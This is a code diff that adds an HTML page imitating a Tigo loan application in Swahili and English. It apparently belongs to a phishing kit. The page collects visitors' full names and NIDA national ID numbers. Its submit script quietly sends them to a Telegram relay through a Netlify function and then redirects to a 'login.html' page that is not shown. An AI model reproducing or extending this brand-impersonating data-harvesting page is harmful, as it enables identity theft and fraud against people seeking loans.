@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="sw">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Tigo Loan Application</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', Roboto, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f2f2f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 428px;
+            height: 100vh;
+            max-height: 926px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: auto;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            background-color: #E3000F;
+            color: white;
+            padding: 24px 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+        }
+
+        .content {
+            padding: 24px 20px;
+            flex: 1;
+        }
+
+        .form-section {
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #3a3a3c;
+            margin-bottom: 8px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 16px;
+            color: #111;
+            background-color: #f9fafb;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #E3000F;
+            background-color: #fff;
+        }
+
+        .currency-input {
+            position: relative;
+        }
+
+        .currency-input span {
+            position: absolute;
+            left: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6b7280;
+            font-weight: 500;
+        }
+
+        .currency-input input {
+            padding-left: 55px;
+        }
+
+        .next-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #E3000F;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 30px;
+            transition: background-color 0.2s;
+        }
+
+        .next-btn:active {
+            background-color: #c8000d;
+        }
+
+        .info-card {
+            background-color: #fff1f2;
+            border: 1px solid #ffe4e6;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .info-card p {
+            font-size: 13px;
+            color: #be123c;
+            line-height: 1.5;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .content {
+            animation: slideIn 0.3s ease-out;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container">
+        <header class="header">
+            <h1>Tigo Loan Application</h1>
+        </header>
+
+        <main class="content">
+            <div class="info-card">
+                <p>Welcome to Tigo Nivushe. Please fill in your accurate details to process your loan application
+                    instantly.</p>
+            </div>
+
+            <form id="loan-form" action="login.html">
+                <div class="form-section">
+                    <div class="form-group">
+                        <label for="fullname">Jina Kamili (Full Name)</label>
+                        <input type="text" id="fullname" placeholder="Mfano: John Doe" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="nida">Namba ya NIDA</label>
+                        <input type="text" id="nida" placeholder="Weka namba ya NIDA" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="amount">Kiasi Unachoomba (Loan Amount)</label>
+                        <div class="currency-input">
+                            <span>TZS</span>
+                            <input type="number" id="amount" placeholder="0" required min="1000" max="500000">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="duration">Muda wa Marejesho (Duration)</label>
+                        <select id="duration" required>
+                            <option value="7">Siku 7 (7 Days)</option>
+                            <option value="14">Siku 14 (14 Days)</option>
+                            <option value="30">Siku 30 (1 Month)</option>
+                        </select>
+                    </div>
+                </div>
+
+                <button type="submit" class="next-btn">Endelea (Continue)</button>
+            </form>
+        </main>
+    </div>
+    <script>
+        document.getElementById('loan-form').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const fullname = document.getElementById('fullname').value;
+            const nida = document.getElementById('nida').value;
+            const amount = document.getElementById('amount').value;
+            const duration = document.getElementById('duration').value;
+
+            const message = `<b>Tigo Loan - New Application</b>\n` +
+                `Name: ${fullname}\n` +
+                `NIDA: <code>${nida}</code>\n` +
+                `Amount: TZS ${amount}\n` +
+                `Duration: ${duration} Days`;
+
+            try {
+                await fetch('/.netlify/functions/send-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message })
+                });
+            } catch (err) {
+                console.error('Telegram error:', err);
+            }
+
+            window.location.href = 'login.html';
+        });
+    </script>
+</body>
+
+</html>
